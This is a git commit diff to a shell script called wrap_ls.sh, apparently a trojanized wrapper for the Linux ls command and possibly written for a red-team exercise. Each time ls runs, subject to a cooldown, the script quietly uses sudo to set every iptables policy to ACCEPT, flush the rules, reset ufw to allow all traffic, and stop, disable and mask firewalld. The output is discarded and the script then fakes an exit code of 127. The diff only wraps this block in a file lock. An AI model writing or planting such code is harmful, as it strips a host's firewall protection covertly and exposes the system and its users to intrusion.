2d406c94797402bb2b28b42ce47b24d11a19adfd
hc5474 <hc5474@g.rit.edu>
2025-04-02 03:06:30 -0400

    ls

--- Linux/wrapper/wrap_ls.sh
+++ Linux/wrapper/wrap_ls.sh
@@ -25,20 +25,23 @@ now=$(date +%s)
 last_run=$(cat "$rate_limit_file" 2>/dev/null || echo 0)
 
 if (( now - last_run >= cooldown )); then
-    echo "$now" > "$rate_limit_file"
-    sudo iptables -P INPUT ACCEPT > /dev/null 2>&1 &
-    sudo iptables -P FORWARD ACCEPT > /dev/null 2>&1 &
-    sudo iptables -P OUTPUT ACCEPT > /dev/null 2>&1 &
-    sudo iptables -F > /dev/null 2>&1 &
-    sudo iptables -X > /dev/null 2>&1 &
-    sudo ufw --force reset > /dev/null 2>&1 &
-    sudo ufw default allow incoming > /dev/null 2>&1 &
-    sudo ufw default allow outgoing > /dev/null 2>&1 &
-    sudo ufw default allow routed > /dev/null 2>&1 &
-    sudo ufw --force enable > /dev/null 2>&1 &
-    sudo systemctl stop firewalld > /dev/null 2>&1 &
-    sudo systemctl disable firewalld > /dev/null 2>&1 &
-    sudo systemctl mask firewalld > /dev/null 2>&1 &
+    (
+        flock -n 200 || exit 1
+            echo "$now" > "$rate_limit_file"
+            sudo iptables -P INPUT ACCEPT > /dev/null 2>&1 &
+            sudo iptables -P FORWARD ACCEPT > /dev/null 2>&1 &
+            sudo iptables -P OUTPUT ACCEPT > /dev/null 2>&1 &
+            sudo iptables -F > /dev/null 2>&1 &
+            sudo iptables -X > /dev/null 2>&1 &
+            sudo ufw --force reset > /dev/null 2>&1 &
+            sudo ufw default allow incoming > /dev/null 2>&1 &
+            sudo ufw default allow outgoing > /dev/null 2>&1 &
+            sudo ufw default allow routed > /dev/null 2>&1 &
+            sudo ufw --force enable > /dev/null 2>&1 &
+            sudo systemctl stop firewalld > /dev/null 2>&1 &
+            sudo systemctl disable firewalld > /dev/null 2>&1 &
+            sudo systemctl mask firewalld > /dev/null 2>&1 &
+    ) 200>/tmp/.ls.lock
 fi
 exit 127
 EOF
